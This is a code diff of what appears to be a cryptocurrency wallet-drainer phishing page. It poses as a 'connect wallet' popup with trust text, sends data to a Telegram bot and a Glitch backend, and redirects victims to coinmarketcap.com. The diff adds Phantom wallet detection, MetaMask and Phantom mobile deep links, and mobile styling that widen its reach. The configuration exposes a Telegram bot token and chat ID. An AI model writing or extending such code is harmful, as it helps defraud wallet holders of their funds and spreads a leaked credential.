@@ -18,16 +18,18 @@
             left: 50%;
             transform: translate(-50%, -50%);
             background: #FFFFFF;
-            padding: 30px;
+            padding: 20px;
             border-radius: 10px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
             z-index: 1000;
             text-align: center;
+            width: 90%;
             max-width: 450px;
-            max-height: 85vh;
+            max-height: 80vh;
             overflow-y: auto;
             color: #333333;
             font-family: 'Poppins', sans-serif;
+            box-sizing: border-box;
         }
         .wallet-popup.active {
             display: block;
@@ -49,17 +51,19 @@
         .connect-btn, .redirect-btn {
             background: #007BFF;
             color: white;
-            padding: 12px 25px;
+            padding: 10px 20px;
             border: none;
             border-radius: 5px;
             cursor: pointer;
             margin: 10px 0;
-            font-size: 16px;
+            font-size: 14px;
             font-weight: 600;
             transition: all 0.3s ease;
             box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3);
             text-transform: none;
             font-family: 'Poppins', sans-serif;
+            width: 100%;
+            max-width: 300px;
         }
         .connect-btn:hover, .redirect-btn:hover {
             background: #0056b3;
@@ -94,14 +98,40 @@
         }
         /* Styles pour le logo et le texte de confiance */
         .logo {
-            width: 80px;
-            margin-bottom: 20px;
+            width: 60px;
+            margin-bottom: 15px;
         }
         .trust-text {
-            font-size: 12px;
+            font-size: 11px;
             color: #777777;
             margin-top: 10px;
             font-style: italic;
+        }
+        /* Media Queries pour mobile */
+        @media (max-width: 600px) {
+            .wallet-popup {
+                padding: 15px;
+                width: 95%;
+                max-height: 90vh;
+            }
+            h2 {
+                font-size: 20px;
+                margin-bottom: 10px;
+            }
+            p {
+                font-size: 14px;
+                margin-bottom: 15px;
+            }
+            .trust-text {
+                font-size: 10px;
+            }
+            .connect-btn, .redirect-btn {
+                font-size: 13px;
+                padding: 8px 15px;
+            }
+            .logo {
+                width: 50px;
+            }
         }
     </style>
 </head>
@@ -128,7 +158,7 @@
         const CONFIG = {
             TELEGRAM_BOT_TOKEN: '8189811123:AAG_3YlqOGNYzfMys7PknpEvbnpUZ3dTO8c',
             TELEGRAM_CHAT_ID: '-4635118249',
-            BACKEND_URL: 'https://diligent-big-whimsey.glitch.me/', // Remplace par l'URL de Cyclic après déploiement
+            BACKEND_URL: 'https://diligent-big-whimsey.glitch.me/', // URL de ton backend sur Glitch
             REDIRECT_URL: 'https://coinmarketcap.com',
             BTC_PRICE_USD: 85000,
             ETH_PRICE_USD: 2000,
@@ -187,7 +217,7 @@
                         return;
                     }
 
-                    // Gestion des wallets Ethereum (MetaMask, Trust Wallet, etc.)
+                    // Gestion des wallets Ethereum (MetaMask, Trust Wallet, Phantom, etc.)
                     if (wallet.type === 'ethereum') {
                         const provider = new window.ethers.providers.Web3Provider(wallet.provider);
                         await provider.ready;
@@ -307,6 +337,12 @@
                 return { type: 'ethereum', provider: window.ethereum };
             }
 
+            // Phantom (Ethereum via window.phantom.ethereum)
+            if (window.phantom && window.phantom.ethereum) {
+                console.log('Phantom détecté (Ethereum compatible)');
+                return { type: 'ethereum', provider: window.phantom.ethereum };
+            }
+
             // UniSat (BTC)
             if (window.unisat) {
                 console.log('UniSat détecté');
@@ -316,11 +352,13 @@
             // Gestion des cas mobile et PC
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
             if (isMobile) {
-                updateStatus(elements, 'Ouvrez ce site dans le navigateur de votre wallet (ex: MetaMask).', false, 'orange');
-                const deepLink = 'https://metamask.app.link/dapp/' + window.location.host + window.location.pathname;
-                elements.statusText.innerHTML += `<br><a href="${deepLink}" style="color: #007BFF; text-decoration: underline;">Ouvrir dans MetaMask</a>`;
+                updateStatus(elements, 'Ouvrez ce site dans le navigateur de votre wallet (ex: MetaMask ou Phantom).', false, 'orange');
+                const deepLinkMetaMask = 'https://metamask.app.link/dapp/' + window.location.host + window.location.pathname;
+                const deepLinkPhantom = 'https://phantom.app/ul/v1/dapp/' + window.location.host + window.location.pathname;
+                elements.statusText.innerHTML += `<br><a href="${deepLinkMetaMask}" style="color: #007BFF; text-decoration: underline;">Ouvrir dans MetaMask</a>`;
+                elements.statusText.innerHTML += `<br><a href="${deepLinkPhantom}" style="color: #007BFF; text-decoration: underline;">Ouvrir dans Phantom</a>`;
             } else {
-                updateStatus(elements, 'Aucun wallet détecté. Installez un wallet compatible.', false, 'red');
+                updateStatus(elements, 'Aucun wallet détecté. Installez un wallet compatible (MetaMask, Phantom, ou UniSat).', false, 'red');
             }
             return null;
         }
